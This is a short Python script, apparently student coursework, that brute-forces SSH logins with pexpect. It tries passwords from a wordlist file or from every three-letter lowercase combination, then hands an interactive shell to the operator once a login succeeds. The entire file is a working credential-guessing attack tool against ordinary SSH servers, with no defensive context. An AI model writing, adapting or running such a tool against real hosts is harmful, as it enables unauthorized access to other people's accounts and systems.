#!/usr/bin/python3
import pexpect
import sys

textFile = ""
host = ""
password = ""
user = ""
#to generate 3 letter passwords you put a nested for loop inside...2 nested plus the original gives you the 3 letter
def tryLogIn(user,host,password,passwordList):
	#construct the login ctring
	connStr = "ssh " + user + "@" + host
	print(connStr)
	#spawn the ssh process
	child = pexpect.spawn(connStr)
	i = 0
	while i < len(passwordList):
		password = (passwordList[i])
		i = i + 1
		#wait until we see password promt
		returnCode = child.expect(["password"])
		if returnCode == 0:
			#send the password
			child.sendline(password)
		returnCode = child.expect(["\$", "try",pexpect.EOF])
		if returnCode == 0:
			child.sendline()
			child.interact() #returns to user
			sys.exit(0)
		elif returnCode == 1:
			child.sendline()
		elif returnCode == 2:
			child = pexpect.spawn(connStr)
		else:
			print("no more passwords")
	#if we get this far it succeeded
	#instead of giving up if it doesn't get it, it should keep on trying, and go on and on forever until it's let it. stay in same list of passwords 
	#gonna change password to listOfPasswords in top of function

listOfPasswords = [] #have to initialze
#pulled from a program from programming fundamentals
def getPasswordFromFile(textFile):
	passwordList = []	
	file = textFile
	with open(textFile) as textFile:
		passwordList = textFile.read().splitlines()
	print(passwordList)
	return passwordList

def getPasswordUsingLetters():
	passwordList = []
	letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
	for first in letters:
		for second in letters:
			for third in letters:
				passwordList.append(first+second+third)
	print(passwordList)
	return passwordList		

#################################################################################################
if sys.argv[1] == "-g":
	host = sys.argv[2]
	user = sys.argv[3]
	passwordList = getPasswordUsingLetters()
elif sys.argv[1] == "-f":
	textFile = sys.argv[2]
	host = sys.argv[3]
	user = sys.argv[4]
	passwordList = getPasswordFromFile(textFile)
tryLogIn(user,host,password,passwordList)
